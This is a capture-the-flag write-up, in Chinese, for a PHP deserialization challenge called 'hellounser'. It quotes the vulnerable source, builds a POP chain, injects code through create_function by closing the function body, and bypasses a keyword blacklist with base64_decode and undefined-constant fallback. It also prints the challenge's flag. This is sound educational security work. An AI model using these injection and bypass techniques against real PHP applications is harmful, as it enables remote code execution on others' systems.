# hellounser 解题报告

## 题目信息
- 题目名称：hellounser (PHP反序列化)
- 环境地址：http://f8dc07d0-2889-461a-926c-b9cf6b72d91b.node5.buuoj.cn:81
- 考点：PHP反序列化 + create_function注入 + 复杂黑名单绕过

## 源码分析

```php
class A {
    public $var;
    public function show(){ echo $this->var; }
    public function __invoke(){ $this->show(); }
}

class B {
    public $func;
    public $arg;
    public function show(){
        $func = $this->func;
        // func不能全是字母数字 = 不能直接使用assert/eval等
        if(preg_match('/^[a-z0-9]*$/isD', $this->func) 
            || preg_match('/fil|cat|more|...|flag|\.|x|\'|"/', $this->arg)) { 
            die('No!No!No!'); 
        } else { 
            include "flag.php";
            $func('', $this->arg); 
        }
    }
    public function __toString(){ $this->show(); return "OK"; }
}

if(isset($_GET['pop'])){
    $aaa = unserialize($_GET['pop']);
    $aaa();  // 触发__invoke
}
```

## 解题步骤

### 第一步：POP链构造
```
$_GET['pop'] → unserialize() → $aaa() → A::__invoke()
→ A::show() → echo $this->var (var = B对象)
→ B::__toString() → B::show()
```

### 第二步：检查绕过

**func 检查**: `preg_match('/^[a-z0-9]*$/isD', $func)` — 要求 func 不能全是字母数字。  
使用 `create_function` (含下划线 `_`) → 检查不通过 → 进入else分支。

**arg 黑名单**: 禁止 `.`、`flag`、`x`、引号等大量关键字。

### 第三步：create_function 注入

`create_function('', $this->arg)` 内部使用 eval 编译匿名函数。  
通过 `}` 闭合函数体，注入任意代码：

```
create_function('', '}INJECTED_CODE;//')
```
内部 eval 结果：
```php
function lambda_N() {}INJECTED_CODE;//}
```

### 第四步：读取Tru3flag.php

arg 中 `.` 和 `flag` 被黑名单拦截。  
利用 `base64_decode` + PHP未定义常量回退机制 构造文件名：

```
require base64_decode(VHJ1M2ZsYWcucGhw);
```
- `VHJ1M2ZsYWcucGhw` 作为常量不存在 → 回退为字符串 `"VHJ1M2ZsYWcucGhw"`
- `base64_decode` 解码后得到 `"Tru3flag.php"`
- `require` 引入该文件，`$TrueFlag` 变量进入当前作用域

### 第五步：获取Flag

```php
var_dump(get_defined_vars());
```

输出显示：
```
["TrueFlag"] => string(42) "flag{6467ce71-d933-469d-bca7-0aedea56f9c6}"
```

## 最终结果
```
flag{6467ce71-d933-469d-bca7-0aedea56f9c6}
```

## 考点总结
1. **PHP反序列化 + POP链构造** — 利用 `__invoke`、`__toString` 魔术方法串联调用链
2. **create_function注入** — 利用 `}` 闭合函数体，绕过执行限制实现代码注入
3. **黑名单绕过** — 利用 `base64_decode` + 未定义常量回退机制构造受限字符串
4. **PHP反序列化环境变量泄露** — `system(ls)` 利用常量回退执行命令
